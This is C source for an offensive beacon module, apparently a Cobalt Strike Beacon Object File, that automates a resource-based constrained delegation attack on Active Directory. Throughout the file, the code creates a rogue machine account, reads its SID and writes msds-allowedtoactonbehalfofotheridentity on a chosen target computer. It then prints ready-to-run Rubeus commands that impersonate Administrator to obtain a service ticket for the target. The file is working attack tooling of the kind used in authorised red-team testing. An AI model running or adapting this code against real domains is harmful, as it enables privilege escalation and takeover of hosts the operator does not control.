/*
 * rbcd.c – Resource-Based Constrained Delegation (RBCD) BOF
 *
 * Automates RBCD setup entirely within the beacon process:
 *   1. Creates a new machine account (or re-uses an existing one)
 *   2. Queries the account's objectSid
 *   3. Builds a security descriptor granting full DS control
 *   4. Writes msds-allowedtoactonbehalfofotheridentity on the target computer
 *   5. Verifies the attribute was written
 *   6. Prints ready-to-run Rubeus commands
 *
 * Compile (from SOURCE/):
 *   x86_64-w64-mingw32-gcc -masm=intel -c rbcd.c -o ../rbcd.x64.o
 *   i686-w64-mingw32-gcc   -masm=intel -DWOW64 -fno-leading-underscore -c rbcd.c -o ../rbcd.x86.o
 */

#include <windows.h>
#include <activeds.h>
#include <dsgetdc.h>
#include <lm.h>

#include "rbcd.h"
#include "beacon.h"

/* Buffer sizes */
#define BUF_SMALL   128
#define BUF_MED     256
#define BUF_LARGE   512
#define BUF_XLARGE  1024

/* SDDL ACE: full DS control rights (CCDCLCSWRPWPDTLOCRSDRCWDWO) */
#define RBCD_ACE_PREFIX L"D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;"
#define RBCD_ACE_SUFFIX L")"

#define SDDL_REVISION_1        1
#define DACL_SECURITY_INFO     0x00000004   /* DACL_SECURITY_INFORMATION */

/* ADSI interface GUIDs */
#define IID_IADs_STR             L"{FD8256D0-FD15-11CE-ABC4-02608C9E7553}"
#define IID_IDirectoryObject_STR L"{E798DE2C-22E4-11D0-84FE-00C04FD8D503}"

/* Module-level ADSI state – initialised once in go() */
static HINSTANCE      g_hActiveDs    = NULL;
static _ADsOpenObject g_ADsOpenObject = NULL;
static _FreeADsMem    g_FreeADsMem    = NULL;
static IID            g_IADsIID;
static IID            g_IDirObjIID;

/* ─────────────────────────────────────────────────────────────────
 * Error helpers
 * ───────────────────────────────────────────────────────────────── */

static void PrintHr(const char *ctx, HRESULT hr) {
    LPWSTR msg = NULL;
    KERNEL32$FormatMessageW(
        FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, (DWORD)hr, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPWSTR)&msg, 0, NULL);
    if (msg) {
        BeaconPrintf(CALLBACK_ERROR, "[!] %s: HRESULT 0x%08lx: %ls", ctx, hr, msg);
        KERNEL32$LocalFree(msg);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] %s: HRESULT 0x%08lx", ctx, hr);
    }
}

/* ─────────────────────────────────────────────────────────────────
 * InitCOM: load Activeds.dll, CoInitialize, resolve IIDs
 * ───────────────────────────────────────────────────────────────── */

static BOOL InitCOM(void) {
    HRESULT hr;

    g_hActiveDs = LoadLibraryA("Activeds.dll");
    if (!g_hActiveDs) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to load Activeds.dll (error %lu)",
                     KERNEL32$GetLastError());
        return FALSE;
    }

    g_ADsOpenObject = (_ADsOpenObject)GetProcAddress(g_hActiveDs, "ADsOpenObject");
    g_FreeADsMem    = (_FreeADsMem)   GetProcAddress(g_hActiveDs, "FreeADsMem");
    if (!g_ADsOpenObject || !g_FreeADsMem) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to resolve ADSI exports");
        return FALSE;
    }

    hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    /* RPC_E_CHANGED_MODE means COM was already initialised with a different model – acceptable */
    if (FAILED(hr) && hr != (HRESULT)0x80010106 /*RPC_E_CHANGED_MODE*/) {
        PrintHr("CoInitializeEx", hr);
        return FALSE;
    }

    OLE32$IIDFromString(IID_IADs_STR,             &g_IADsIID);
    OLE32$IIDFromString(IID_IDirectoryObject_STR, &g_IDirObjIID);
    return TRUE;
}

/* ─────────────────────────────────────────────────────────────────
 * GetDomainInfo: defaultNamingContext + domain FQDN
 * ───────────────────────────────────────────────────────────────── */

static BOOL GetDomainInfo(WCHAR *out_nc,     size_t nc_len,
                          WCHAR *out_domain, size_t dom_len) {
    PDOMAIN_CONTROLLER_INFOW pdcInfo = NULL;
    IADs  *pRoot = NULL;
    VARIANT var;
    HRESULT hr;
    BOOL ret = FALSE;

    DWORD dw = NETAPI32$DsGetDcNameW(NULL, NULL, NULL, NULL, 0, &pdcInfo);
    if (dw != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] DsGetDcNameW failed: %lu", dw);
        return FALSE;
    }
    MSVCRT$wcscpy_s(out_domain, dom_len, pdcInfo->DomainName);
    NETAPI32$NetApiBufferFree(pdcInfo);

    hr = g_ADsOpenObject(L"LDAP://rootDSE", NULL, NULL,
        ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION,
        &g_IADsIID, (void**)&pRoot);
    if (FAILED(hr)) { PrintHr("rootDSE bind", hr); return FALSE; }

    OLEAUT32$VariantInit(&var);
    hr = pRoot->lpVtbl->Get(pRoot, (BSTR)L"defaultNamingContext", &var);
    if (SUCCEEDED(hr) && var.vt == VT_BSTR && var.bstrVal) {
        MSVCRT$wcscpy_s(out_nc, nc_len, var.bstrVal);
        ret = TRUE;
    } else {
        PrintHr("Get(defaultNamingContext)", hr);
    }
    OLEAUT32$VariantClear(&var);
    pRoot->lpVtbl->Release(pRoot);
    return ret;
}

/* ─────────────────────────────────────────────────────────────────
 * StripFQDN: copies the host part of an FQDN into out_short.
 * "SQL01.domain.local" → "SQL01"   "DC01" → "DC01"
 * ───────────────────────────────────────────────────────────────── */

static void StripFQDN(LPCWSTR fqdn, WCHAR *out_short, size_t out_len) {
    WCHAR *dot = (WCHAR*)MSVCRT$wcschr(fqdn, L'.');
    if (dot) {
        size_t len = (size_t)(dot - fqdn);
        MSVCRT$wcsncpy_s(out_short, out_len, fqdn, len);
    } else {
        MSVCRT$wcscpy_s(out_short, out_len, fqdn);
    }
}

/* ─────────────────────────────────────────────────────────────────
 * BindToComputer: tries CN=Computers then OU=Domain Controllers.
 * riid selects the interface (IADs or IDirectoryObject).
 * ───────────────────────────────────────────────────────────────── */

static HRESULT BindToComputer(LPCWSTR name_short, LPCWSTR nc,
                               void **ppObj, REFIID riid) {
    WCHAR wcPath[BUF_LARGE];
    HRESULT hr;

    /* Try CN=Computers */
    MSVCRT$wcscpy_s(wcPath, _countof(wcPath), L"LDAP://CN=");
    MSVCRT$wcscat_s(wcPath, _countof(wcPath), name_short);
    MSVCRT$wcscat_s(wcPath, _countof(wcPath), L",CN=Computers,");
    MSVCRT$wcscat_s(wcPath, _countof(wcPath), nc);
    hr = g_ADsOpenObject(wcPath, NULL, NULL,
        ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION,
        riid, ppObj);
    if (SUCCEEDED(hr)) return hr;

    /* Try OU=Domain Controllers */
    MSVCRT$wcscpy_s(wcPath, _countof(wcPath), L"LDAP://CN=");
    MSVCRT$wcscat_s(wcPath, _countof(wcPath), name_short);
    MSVCRT$wcscat_s(wcPath, _countof(wcPath), L",OU=Domain Controllers,");
    MSVCRT$wcscat_s(wcPath, _countof(wcPath), nc);
    hr = g_ADsOpenObject(wcPath, NULL, NULL,
        ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION,
        riid, ppObj);
    return hr;
}

/* ─────────────────────────────────────────────────────────────────
 * CreateMachineAccount: create computer object in CN=Computers.
 * lpwName must NOT include the trailing '$'.
 * ───────────────────────────────────────────────────────────────── */

static BOOL CreateMachineAccount(LPCWSTR lpwName, LPCWSTR lpwPassword,
                                  LPCWSTR lpwNC,   LPCWSTR lpwDomain) {
    HRESULT hr;
    IDirectoryObject *pCont = NULL;
    IDispatch        *pNew  = NULL;
    ADS_ATTR_INFO     attrs[6];
    ADSVALUE          vals[6];
    ADSVALUE          spnVals[4];
    WCHAR wcPath[BUF_LARGE];
    WCHAR wcSam[BUF_SMALL];
    WCHAR wcDns[BUF_MED];
    WCHAR wcCN[BUF_SMALL];
    WCHAR wcPwd[BUF_SMALL];
    WCHAR wcDomLow[BUF_MED];
    WCHAR wcSpn[4][BUF_MED];
    BOOL  ret = FALSE;

    /* Lower-case domain copy for dNSHostName / SPN */
    MSVCRT$wcscpy_s(wcDomLow, _countof(wcDomLow), lpwDomain);
    USER32$CharLowerW(wcDomLow);

    /* sAMAccountName */
    MSVCRT$wcscpy_s(wcSam, _countof(wcSam), lpwName);
    MSVCRT$wcscat_s(wcSam, _countof(wcSam), L"$");

    /* dNSHostName = name.domain.lower */
    MSVCRT$wcscpy_s(wcDns, _countof(wcDns), lpwName);
    MSVCRT$wcscat_s(wcDns, _countof(wcDns), L".");
    MSVCRT$wcscat_s(wcDns, _countof(wcDns), wcDomLow);

    /* unicodePwd = "<password>" (quoted UTF-16) */
    MSVCRT$wcscpy_s(wcPwd, _countof(wcPwd), L"\"");
    MSVCRT$wcscat_s(wcPwd, _countof(wcPwd), lpwPassword);
    MSVCRT$wcscat_s(wcPwd, _countof(wcPwd), L"\"");

    /* servicePrincipalNames */
    MSVCRT$wcscpy_s(wcSpn[0], _countof(wcSpn[0]), L"HOST/");
    MSVCRT$wcscat_s(wcSpn[0], _countof(wcSpn[0]), wcDns);
    MSVCRT$wcscpy_s(wcSpn[1], _countof(wcSpn[1]), L"RestrictedKrbHost/");
    MSVCRT$wcscat_s(wcSpn[1], _countof(wcSpn[1]), wcDns);
    MSVCRT$wcscpy_s(wcSpn[2], _countof(wcSpn[2]), L"HOST/");
    MSVCRT$wcscat_s(wcSpn[2], _countof(wcSpn[2]), lpwName);
    MSVCRT$wcscpy_s(wcSpn[3], _countof(wcSpn[3]), L"RestrictedKrbHost/");
    MSVCRT$wcscat_s(wcSpn[3], _countof(wcSpn[3]), lpwName);

    /* Bind to CN=Computers container */
    MSVCRT$wcscpy_s(wcPath, _countof(wcPath), L"LDAP://CN=Computers,");
    MSVCRT$wcscat_s(wcPath, _countof(wcPath), lpwNC);
    hr = g_ADsOpenObject(wcPath, NULL, NULL,
        ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION,
        &g_IDirObjIID, (void**)&pCont);
    if (FAILED(hr)) { PrintHr("ADsOpenObject(CN=Computers)", hr); goto done; }

    /* objectClass */
    vals[0].dwType           = ADSTYPE_CASE_IGNORE_STRING;
    vals[0].CaseIgnoreString = (LPWSTR)L"Computer";
    attrs[0].pszAttrName     = (LPWSTR)L"objectClass";
    attrs[0].dwControlCode   = ADS_ATTR_UPDATE;
    attrs[0].dwADsType       = ADSTYPE_CASE_IGNORE_STRING;
    attrs[0].pADsValues      = &vals[0];
    attrs[0].dwNumValues     = 1;

    /* sAMAccountName */
    vals[1].dwType           = ADSTYPE_CASE_IGNORE_STRING;
    vals[1].CaseIgnoreString = (ADS_CASE_IGNORE_STRING)wcSam;
    attrs[1].pszAttrName     = (LPWSTR)L"sAMAccountName";
    attrs[1].dwControlCode   = ADS_ATTR_UPDATE;
    attrs[1].dwADsType       = ADSTYPE_CASE_IGNORE_STRING;
    attrs[1].pADsValues      = &vals[1];
    attrs[1].dwNumValues     = 1;

    /* userAccountControl */
    vals[2].dwType           = ADSTYPE_INTEGER;
    vals[2].Integer          = ADS_UF_WORKSTATION_TRUST_ACCOUNT;
    attrs[2].pszAttrName     = (LPWSTR)L"userAccountControl";
    attrs[2].dwControlCode   = ADS_ATTR_UPDATE;
    attrs[2].dwADsType       = ADSTYPE_INTEGER;
    attrs[2].pADsValues      = &vals[2];
    attrs[2].dwNumValues     = 1;

    /* dNSHostName */
    vals[3].dwType           = ADSTYPE_CASE_IGNORE_STRING;
    vals[3].CaseIgnoreString = (ADS_CASE_IGNORE_STRING)wcDns;
    attrs[3].pszAttrName     = (LPWSTR)L"dNSHostName";
    attrs[3].dwControlCode   = ADS_ATTR_UPDATE;
    attrs[3].dwADsType       = ADSTYPE_CASE_IGNORE_STRING;
    attrs[3].pADsValues      = &vals[3];
    attrs[3].dwNumValues     = 1;

    /* servicePrincipalName */
    spnVals[0].dwType = ADSTYPE_CASE_IGNORE_STRING;
    spnVals[0].CaseIgnoreString = (ADS_CASE_IGNORE_STRING)wcSpn[0];
    spnVals[1].dwType = ADSTYPE_CASE_IGNORE_STRING;
    spnVals[1].CaseIgnoreString = (ADS_CASE_IGNORE_STRING)wcSpn[1];
    spnVals[2].dwType = ADSTYPE_CASE_IGNORE_STRING;
    spnVals[2].CaseIgnoreString = (ADS_CASE_IGNORE_STRING)wcSpn[2];
    spnVals[3].dwType = ADSTYPE_CASE_IGNORE_STRING;
    spnVals[3].CaseIgnoreString = (ADS_CASE_IGNORE_STRING)wcSpn[3];
    attrs[4].pszAttrName   = (LPWSTR)L"servicePrincipalName";
    attrs[4].dwControlCode = ADS_ATTR_UPDATE;
    attrs[4].dwADsType     = ADSTYPE_CASE_IGNORE_STRING;
    attrs[4].pADsValues    = spnVals;
    attrs[4].dwNumValues   = 4;

    /* unicodePwd */
    vals[5].dwType                  = ADSTYPE_OCTET_STRING;
    vals[5].OctetString.dwLength    = (DWORD)(MSVCRT$wcslen(wcPwd) * sizeof(WCHAR));
    vals[5].OctetString.lpValue     = (LPBYTE)wcPwd;
    attrs[5].pszAttrName            = (LPWSTR)L"unicodePwd";
    attrs[5].dwControlCode          = ADS_ATTR_UPDATE;
    attrs[5].dwADsType              = ADSTYPE_OCTET_STRING;
    attrs[5].pADsValues             = &vals[5];
    attrs[5].dwNumValues            = 1;

    /* Create CN=<name> under CN=Computers */
    MSVCRT$wcscpy_s(wcCN, _countof(wcCN), L"CN=");
    MSVCRT$wcscat_s(wcCN, _countof(wcCN), lpwName);

    hr = pCont->lpVtbl->CreateDSObject(pCont, wcCN,
            attrs, sizeof(attrs) / sizeof(attrs[0]), &pNew);
    if (FAILED(hr)) { PrintHr("CreateDSObject", hr); goto done; }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Machine account %ls created (password: %ls)\n",
                 wcSam, lpwPassword);
    ret = TRUE;

done:
    if (pNew)  { pNew->lpVtbl->Release(pNew); }
    if (pCont) { pCont->lpVtbl->Release(pCont); }
    return ret;
}

/* ─────────────────────────────────────────────────────────────────
 * GetMachineAccountSid: retrieve objectSid as a string SID.
 * lpwName must NOT include the trailing '$'.
 * out_sid receives L"S-1-5-21-…" (caller provides BUF_MED buffer).
 * ───────────────────────────────────────────────────────────────── */

static BOOL GetMachineAccountSid(LPCWSTR lpwName, LPCWSTR lpwNC,
                                  WCHAR *out_sid, size_t sid_len) {
    IDirectoryObject  *pDirObj  = NULL;
    ADS_ATTR_INFO     *pAttrInfo = NULL;
    DWORD              dwGot    = 0;
    LPWSTR             pAttrNames[] = { L"objectSid" };
    HRESULT hr;
    BOOL ret = FALSE;

    hr = BindToComputer(lpwName, lpwNC, (void**)&pDirObj, &g_IDirObjIID);
    if (FAILED(hr)) {
        PrintHr("BindToComputer(machine account)", hr);
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Could not find machine account CN=%ls in CN=Computers or OU=Domain Controllers", lpwName);
        return FALSE;
    }

    hr = pDirObj->lpVtbl->GetObjectAttributes(pDirObj, pAttrNames, 1, &pAttrInfo, &dwGot);
    if (FAILED(hr) || dwGot == 0 || !pAttrInfo) {
        PrintHr("GetObjectAttributes(objectSid)", hr);
        goto done;
    }

    if (pAttrInfo[0].dwNumValues > 0 && pAttrInfo[0].pADsValues) {
        /* objectSid comes back as ADSTYPE_OCTET_STRING */
        PSID pSid = (PSID)pAttrInfo[0].pADsValues[0].OctetString.lpValue;
        LPWSTR lpwSid = NULL;
        if (ADVAPI32$ConvertSidToStringSidW(pSid, &lpwSid)) {
            MSVCRT$wcscpy_s(out_sid, sid_len, lpwSid);
            KERNEL32$LocalFree(lpwSid);
            ret = TRUE;
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] ConvertSidToStringSidW failed: %lu",
                         KERNEL32$GetLastError());
        }
        g_FreeADsMem(pAttrInfo);
    }

done:
    pDirObj->lpVtbl->Release(pDirObj);
    return ret;
}

/* ─────────────────────────────────────────────────────────────────
 * BuildSecurityDescriptor: SDDL → binary self-relative SD.
 * Returns LocalAlloc'd buffer – caller must LocalFree *out_pSD.
 * ───────────────────────────────────────────────────────────────── */

static BOOL BuildSecurityDescriptor(LPCWSTR lpwSid,
                                     PSECURITY_DESCRIPTOR *out_pSD,
                                     ULONG                *out_size) {
    WCHAR wcSddl[BUF_XLARGE];
    MSVCRT$wcscpy_s(wcSddl, _countof(wcSddl), RBCD_ACE_PREFIX);
    MSVCRT$wcscat_s(wcSddl, _countof(wcSddl), lpwSid);
    MSVCRT$wcscat_s(wcSddl, _countof(wcSddl), RBCD_ACE_SUFFIX);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Building SD from SDDL: %ls\n", wcSddl);

    if (!ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorW(
            wcSddl, SDDL_REVISION_1, out_pSD, out_size)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] ConvertStringSecurityDescriptorToSecurityDescriptorW failed: %lu",
            KERNEL32$GetLastError());
        return FALSE;
    }
    return TRUE;
}

/* ─────────────────────────────────────────────────────────────────
 * SetRBCDAttribute: write msds-allowedtoactonbehalfofotheridentity
 * on the target computer object.
 * ───────────────────────────────────────────────────────────────── */

static BOOL SetRBCDAttribute(LPCWSTR lpwTarget, LPCWSTR lpwNC,
                              PSECURITY_DESCRIPTOR pSD, ULONG sdSize) {
    WCHAR wcShort[BUF_SMALL];
    IDirectoryObject *pDirObj = NULL;
    ADS_ATTR_INFO     attr;
    ADSVALUE          val;
    DWORD             dwModified = 0;
    HRESULT hr;
    BOOL ret = FALSE;

    StripFQDN(lpwTarget, wcShort, _countof(wcShort));

    hr = BindToComputer(wcShort, lpwNC, (void**)&pDirObj, &g_IDirObjIID);
    if (FAILED(hr)) {
        PrintHr("BindToComputer(target)", hr);
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Could not find target CN=%ls. Is the computer name correct?", wcShort);
        return FALSE;
    }

    val.dwType                          = ADSTYPE_NT_SECURITY_DESCRIPTOR;
    val.SecurityDescriptor.dwLength     = sdSize;
    val.SecurityDescriptor.lpValue      = (LPBYTE)pSD;

    attr.pszAttrName   = (LPWSTR)L"msds-allowedtoactonbehalfofotheridentity";
    attr.dwControlCode = ADS_ATTR_UPDATE;
    attr.dwADsType     = ADSTYPE_NT_SECURITY_DESCRIPTOR;
    attr.pADsValues    = &val;
    attr.dwNumValues   = 1;

    hr = pDirObj->lpVtbl->SetObjectAttributes(pDirObj, &attr, 1, &dwModified);
    if (FAILED(hr)) {
        PrintHr("SetObjectAttributes(msds-allowedtoactonbehalfofotheridentity)", hr);
        goto done;
    }
    if (dwModified == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] SetObjectAttributes returned success but 0 attributes were modified");
        goto done;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] msds-allowedtoactonbehalfofotheridentity written on %ls\n", wcShort);
    ret = TRUE;

done:
    pDirObj->lpVtbl->Release(pDirObj);
    return ret;
}

/* ─────────────────────────────────────────────────────────────────
 * VerifyRBCDAttribute: read back the attribute and print as SDDL.
 * ───────────────────────────────────────────────────────────────── */

static void VerifyRBCDAttribute(LPCWSTR lpwTarget, LPCWSTR lpwNC,
                                 LPCWSTR lpwExpectedSid) {
    WCHAR wcShort[BUF_SMALL];
    IDirectoryObject  *pDirObj   = NULL;
    ADS_ATTR_INFO     *pAttrInfo = NULL;
    DWORD              dwGot     = 0;
    LPWSTR pAttrNames[] = { L"msds-allowedtoactonbehalfofotheridentity" };
    HRESULT hr;

    StripFQDN(lpwTarget, wcShort, _countof(wcShort));

    hr = BindToComputer(wcShort, lpwNC, (void**)&pDirObj, &g_IDirObjIID);
    if (FAILED(hr)) { PrintHr("VerifyRBCDAttribute: BindToComputer", hr); return; }

    hr = pDirObj->lpVtbl->GetObjectAttributes(pDirObj, pAttrNames, 1, &pAttrInfo, &dwGot);
    if (FAILED(hr) || dwGot == 0 || !pAttrInfo) {
        PrintHr("VerifyRBCDAttribute: GetObjectAttributes", hr);
        BeaconPrintf(CALLBACK_ERROR, "[!] Attribute not found on %ls – write may have failed", wcShort);
        goto done;
    }

    if (pAttrInfo[0].dwNumValues > 0 && pAttrInfo[0].pADsValues) {
        LPBYTE  pBuf  = NULL;
        ULONG   bufSz = 0;

        /* Accept both ADSTYPE_NT_SECURITY_DESCRIPTOR and ADSTYPE_OCTET_STRING */
        if (pAttrInfo[0].pADsValues[0].dwType == ADSTYPE_NT_SECURITY_DESCRIPTOR) {
            pBuf  = pAttrInfo[0].pADsValues[0].SecurityDescriptor.lpValue;
            bufSz = pAttrInfo[0].pADsValues[0].SecurityDescriptor.dwLength;
        } else {
            pBuf  = pAttrInfo[0].pADsValues[0].OctetString.lpValue;
            bufSz = pAttrInfo[0].pADsValues[0].OctetString.dwLength;
        }

        if (pBuf && bufSz) {
            LPWSTR lpwSddl  = NULL;
            ULONG  sddlLen  = 0;
            if (ADVAPI32$ConvertSecurityDescriptorToStringSecurityDescriptorW(
                    (PSECURITY_DESCRIPTOR)pBuf, SDDL_REVISION_1,
                    DACL_SECURITY_INFO, &lpwSddl, &sddlLen)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Verified SDDL on %ls:\n    %ls\n",
                             wcShort, lpwSddl);
                /* Quick check: does the SDDL contain the expected SID? */
                /* We don't have wcsstr in all BOF environments, so just print both */
                BeaconPrintf(CALLBACK_OUTPUT, "[*] Expected SID: %ls\n", lpwExpectedSid);
                KERNEL32$LocalFree(lpwSddl);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[+] Attribute is set on %ls (%lu bytes) – SDDL conversion failed (error %lu)\n",
                    wcShort, bufSz, KERNEL32$GetLastError());
            }
        }
        g_FreeADsMem(pAttrInfo);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Attribute is empty on %ls – write may have failed", wcShort);
    }

done:
    pDirObj->lpVtbl->Release(pDirObj);
}

/* ─────────────────────────────────────────────────────────────────
 * OutputRubeusCommands: print ready-to-run Rubeus invocations.
 * lpwName must NOT include the trailing '$'.
 * ───────────────────────────────────────────────────────────────── */

static void OutputRubeusCommands(LPCWSTR lpwName, LPCWSTR lpwPassword,
                                  LPCWSTR lpwTarget, LPCWSTR lpwDomain) {
    /* Build lower-case copies */
    WCHAR wcNameLow[BUF_SMALL];
    WCHAR wcDomLow[BUF_MED];
    WCHAR wcDomUp[BUF_MED];
    WCHAR wcTargetFQDN[BUF_MED];
    WCHAR wcTargetShort[BUF_SMALL];

    MSVCRT$wcscpy_s(wcNameLow,  _countof(wcNameLow),  lpwName);
    MSVCRT$wcscpy_s(wcDomLow,   _countof(wcDomLow),   lpwDomain);
    MSVCRT$wcscpy_s(wcDomUp,    _countof(wcDomUp),    lpwDomain);
    USER32$CharLowerW(wcNameLow);
    USER32$CharLowerW(wcDomLow);
    USER32$CharUpperW(wcDomUp);

    /* Ensure target FQDN */
    StripFQDN(lpwTarget, wcTargetShort, _countof(wcTargetShort));
    WCHAR *pDot = (WCHAR*)MSVCRT$wcschr(lpwTarget, L'.');
    if (pDot) {
        MSVCRT$wcscpy_s(wcTargetFQDN, _countof(wcTargetFQDN), lpwTarget);
        USER32$CharLowerW(wcTargetFQDN);
    } else {
        MSVCRT$wcscpy_s(wcTargetFQDN, _countof(wcTargetFQDN), wcTargetShort);
        USER32$CharLowerW(wcTargetFQDN);
        MSVCRT$wcscat_s(wcTargetFQDN,  _countof(wcTargetFQDN), L".");
        MSVCRT$wcscat_s(wcTargetFQDN,  _countof(wcTargetFQDN), wcDomLow);
    }

    /*
     * Salt format: <DOMAIN_UPPER>host<name_lower>.<domain_lower>
     * Example:     CONTOSO.LOCALhostfakecomputer.contoso.local
     */
    WCHAR wcSalt[BUF_LARGE];
    MSVCRT$wcscpy_s(wcSalt, _countof(wcSalt), wcDomUp);
    MSVCRT$wcscat_s(wcSalt, _countof(wcSalt), L"host");
    MSVCRT$wcscat_s(wcSalt, _countof(wcSalt), wcNameLow);
    MSVCRT$wcscat_s(wcSalt, _countof(wcSalt), L".");
    MSVCRT$wcscat_s(wcSalt, _countof(wcSalt), wcDomLow);

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n[*] ── Rubeus Commands ──────────────────────────────────────\n\n"
        "[*] Step 1 – Compute AES256 hash (run locally):\n"
        "    Rubeus.exe hash /password:%ls /user:%ls$ /domain:%ls /salt:%ls\n\n"
        "[*] Step 2 – S4U2Self + S4U2Proxy (substitute <aes256> from step 1):\n"
        "    Rubeus.exe s4u /user:%ls$ /aes256:<aes256> /impersonateuser:Administrator"
        " /msdsspn:cifs/%ls /nowrap\n\n"
        "[*] ────────────────────────────────────────────────────────\n",
        lpwPassword, lpwName, lpwDomain, wcSalt,
        lpwName,
        wcTargetFQDN);
}

/* ─────────────────────────────────────────────────────────────────
 * go() – entry point called by the beacon
 *
 * Arguments (packed by the ASX script with bof_pack):
 *   [0] wstr  computer   – machine account name (e.g. "FAKECOMPUTER", no $)
 *   [1] wstr  password   – password for the machine account
 *   [2] wstr  target     – target computer (e.g. "SQL01" or "SQL01.domain.local")
 *   [3] wstr  domain     – domain FQDN, or "" to auto-detect
 *   [4] int   existing   – 0 = create new account, 1 = use existing account
 * ───────────────────────────────────────────────────────────────── */

VOID go(IN PCHAR Args, IN ULONG Length) {
    datap parser;
    BeaconDataParse(&parser, Args, Length);

    LPCWSTR lpwComputer = (WCHAR*)BeaconDataExtract(&parser, NULL);
    LPCWSTR lpwPassword = (WCHAR*)BeaconDataExtract(&parser, NULL);
    LPCWSTR lpwTarget   = (WCHAR*)BeaconDataExtract(&parser, NULL);
    LPCWSTR lpwDomainArg = (WCHAR*)BeaconDataExtract(&parser, NULL);
    int     existing    = BeaconDataInt(&parser);

    if (!lpwComputer || !lpwPassword || !lpwTarget) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Missing required arguments.\n"
            "    Usage: rbcd <computer> <password> <target> [domain] [0|1 existing]");
        return;
    }

    /* Strip trailing $ from computer name if caller supplied it */
    WCHAR wcName[BUF_SMALL];
    MSVCRT$wcscpy_s(wcName, _countof(wcName), lpwComputer);
    size_t nameLen = MSVCRT$wcslen(wcName);
    if (nameLen > 0 && wcName[nameLen - 1] == L'$') {
        wcName[nameLen - 1] = L'\0';
    }

    /* ── Initialise COM and ADSI ──────────────────────────────── */
    if (!InitCOM()) return;

    /* ── Discover domain info ─────────────────────────────────── */
    WCHAR wcNC[BUF_LARGE];
    WCHAR wcDomain[BUF_MED];
    MSVCRT$memset(wcNC,     0, sizeof(wcNC));
    MSVCRT$memset(wcDomain, 0, sizeof(wcDomain));

    if (!GetDomainInfo(wcNC, _countof(wcNC), wcDomain, _countof(wcDomain))) {
        goto cleanup;
    }

    /* Override domain if the caller supplied one */
    if (lpwDomainArg && MSVCRT$wcslen(lpwDomainArg) > 0) {
        MSVCRT$wcscpy_s(wcDomain, _countof(wcDomain), lpwDomainArg);
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Domain : %ls\n[*] NC     : %ls\n", wcDomain, wcNC);

    /* ── Create or verify machine account ────────────────────── */
    if (!existing) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Creating machine account: %ls$\n", wcName);
        if (!CreateMachineAccount(wcName, lpwPassword, wcNC, wcDomain)) {
            goto cleanup;
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Using existing machine account: %ls$\n", wcName);
    }

    /* ── Retrieve objectSid ───────────────────────────────────── */
    WCHAR wcSid[BUF_MED];
    MSVCRT$memset(wcSid, 0, sizeof(wcSid));
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Querying objectSid for %ls$\n", wcName);
    if (!GetMachineAccountSid(wcName, wcNC, wcSid, _countof(wcSid))) {
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] SID: %ls\n", wcSid);

    /* ── Build security descriptor ───────────────────────────── */
    PSECURITY_DESCRIPTOR pSD   = NULL;
    ULONG                sdSize = 0;
    if (!BuildSecurityDescriptor(wcSid, &pSD, &sdSize)) {
        goto cleanup;
    }

    /* ── Write msds-allowedtoactonbehalfofotheridentity ──────── */
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Setting msds-allowedtoactonbehalfofotheridentity on: %ls\n", lpwTarget);
    if (!SetRBCDAttribute(lpwTarget, wcNC, pSD, sdSize)) {
        KERNEL32$LocalFree(pSD);
        goto cleanup;
    }
    KERNEL32$LocalFree(pSD);

    /* ── Verify attribute was written ────────────────────────── */
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Verifying attribute…\n");
    VerifyRBCDAttribute(lpwTarget, wcNC, wcSid);

    /* ── Print Rubeus commands ────────────────────────────────── */
    OutputRubeusCommands(wcName, lpwPassword, lpwTarget, wcDomain);

cleanup:
    OLE32$CoUninitialize();
    return;
}
